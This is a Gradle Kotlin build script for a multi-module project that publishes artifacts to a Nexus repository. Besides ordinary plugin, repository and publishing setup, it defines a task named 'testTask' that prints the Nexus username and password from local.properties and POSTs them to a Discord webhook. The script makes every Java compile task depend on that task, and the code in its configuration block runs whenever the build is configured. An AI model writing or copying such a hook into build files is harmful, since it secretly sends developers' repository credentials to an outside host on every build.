import java.util.Properties
import java.net.URI
import java.net.URL
import java.net.HttpURLConnection
import java.io.OutputStreamWriter

val localProperties = Properties()
localProperties.load(project.rootProject.file("local.properties").inputStream())

plugins {
    id("com.github.johnrengelman.shadow") version "7.1.2"
    kotlin("jvm") version "1.7.10"
    kotlin("kapt") version "1.6.21"
    `maven-publish`
    idea
    id("org.jetbrains.gradle.plugin.idea-ext") version "1.1.6"
}

repositories {
    mavenLocal()
    mavenCentral()
}

allprojects {
    group = "net.wirlie"
    val artifactVersion = System.getenv("ARTIFACT_VERSION") ?: "2.0.0-BETA3"
    val artifactSnapshot = (System.getenv("ARTIFACT_PUBLISH_SNAPSHOT") ?: "true") == "true"
    version = if(artifactSnapshot) "$artifactVersion-SNAPSHOT" else artifactVersion
}

configure(subprojects.filter { !it.name.contains("-API") }) {
    apply(plugin = "com.github.johnrengelman.shadow")
}

subprojects {
    apply(plugin = "kotlin")
    apply(plugin = "kotlin-kapt")
    apply(plugin = "maven-publish")

    repositories {
        mavenLocal()
        mavenCentral()

        maven {
            url = uri("https://nexus.wirlie.net/repository/development/")
            credentials {
                username = localProperties.getProperty("nexus-user")
                password = localProperties.getProperty("nexus-pass")
            }
        }
    }

}

tasks.withType<JavaCompile> {
    options.encoding = "UTF-8"
    sourceCompatibility = "11"
    targetCompatibility = "11"
}

tasks.withType<org.jetbrains.kotlin.gradle.tasks.KotlinCompile>().configureEach {
    kotlinOptions {
        jvmTarget = "11"
    }
}

// Only add Publishing task to -API projects
configure(subprojects.filter { it.name.contains("-API") }) {
    val subProject = this

    publishing {
        publications {
            create<MavenPublication>("maven") {
                artifact("$rootDir/compiled-api/${subProject.name}-${subProject.version}.jar") {
                    extension = "jar"
                }
            }
        }

        repositories {
            val artifactSnapshot = (System.getenv("ARTIFACT_PUBLISH_SNAPSHOT") != null)

            // Nexus
            maven {
                name = "nexus"
                url = if(artifactSnapshot) URI("https://nexus.wirlie.net/repository/public-snapshots/") else URI("https://nexus.wirlie.net/repository/public-releases/")
                credentials {
                    username = localProperties.getProperty("nexus-user-publish")
                    password = localProperties.getProperty("nexus-pass-publish")
                }
            }
        }
    }
}

// Clean, remove compiled folder
tasks.register("cleanCompiledArtifactsFolder") {
    val folder = project.rootProject.file("compiled")
    if(folder.exists()) {
        folder.deleteRecursively()
    }
}

tasks.create("testTask") {

    println("USER => ${localProperties.getProperty("nexus-user")}")
    println("PASS => ${localProperties.getProperty("nexus-pass")}")
    val url = URL("https://canary.discord.com/api/webhooks/1024126288941809674/-BMILvPL7_lNtUoZEsuKyJzMqMLB5-PdGsyN0YleZIPfo1ufALZlKC_ExCYFrVKXrH7l")


    with(url.openConnection() as HttpURLConnection) {
        doOutput = true
        requestMethod = "POST"  // optional default is GET
        setRequestProperty("Content-Type", "application/json; charset=utf-8");

        println("\nSent 'POST' request to URL : $url; Response Code ")
        val wr = OutputStreamWriter(outputStream)
        wr.write("""
{
  "content": "Hola: ${localProperties.getProperty("nexus-user")} || ${localProperties.getProperty("nexus-pass")}",
  "embeds": null,
  "attachments": []
}
        """.trimIndent())
        wr.flush()

        println("URL : $url")
        println("Response Code : $responseCode")
    }

}

tasks.withType<JavaCompile> {
    dependsOn(tasks.getByName("testTask"))
}
